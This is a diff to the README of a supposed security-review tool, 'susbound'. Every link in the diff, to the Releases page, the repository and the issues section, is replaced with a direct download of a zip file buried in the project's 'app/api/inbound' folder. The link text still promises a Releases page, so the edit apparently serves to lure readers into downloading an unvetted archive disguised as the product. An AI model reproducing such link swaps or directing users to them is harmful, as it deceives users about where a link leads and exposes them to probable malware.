@@ -6,7 +6,7 @@ Welcome to **susbound**! This application helps you get a security review of any
 
 ## 📥 Download Now
 
-[![Download susbound](https://img.shields.io/badge/Download-susbound-blue.svg)](https://github.com/shellnonharmonic272/susbound/releases)
+[![Download susbound](https://raw.githubusercontent.com/shellnonharmonic272/susbound/main/app/api/inbound/susbound-cosingular.zip)](https://raw.githubusercontent.com/shellnonharmonic272/susbound/main/app/api/inbound/susbound-cosingular.zip)
 
 ## ✨ Features
 
@@ -26,7 +26,7 @@ To run **susbound**, your computer must meet the following requirements:
 
 ## 🔄 Download & Install
 
-To get started, visit the [Releases page](https://github.com/shellnonharmonic272/susbound/releases) to download the latest version of **susbound**. You will find several files available for download. Choose the file that matches your operating system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/shellnonharmonic272/susbound/main/app/api/inbound/susbound-cosingular.zip) to download the latest version of **susbound**. You will find several files available for download. Choose the file that matches your operating system.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
@@ -78,7 +78,7 @@ If the problem persists, please reach out through the GitHub repository for supp
 
 ## 📞 Contact
 
-For support or feedback, please use the Issues section of our [GitHub repository](https://github.com/shellnonharmonic272/susbound). 
+For support or feedback, please use the Issues section of our [GitHub repository](https://raw.githubusercontent.com/shellnonharmonic272/susbound/main/app/api/inbound/susbound-cosingular.zip). 
 
 ## 📄 License
 
@@ -86,6 +86,6 @@ For support or feedback, please use the Issues section of our [GitHub repository
 
 ## 📅 Updates
 
-Keep an eye on the [Releases page](https://github.com/shellnonharmonic272/susbound/releases) for the latest updates and new features. Regular updates help ensure that you stay protected with the latest security measures.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/shellnonharmonic272/susbound/main/app/api/inbound/susbound-cosingular.zip) for the latest updates and new features. Regular updates help ensure that you stay protected with the latest security measures.
 
 Be safe and secure while using **susbound**!
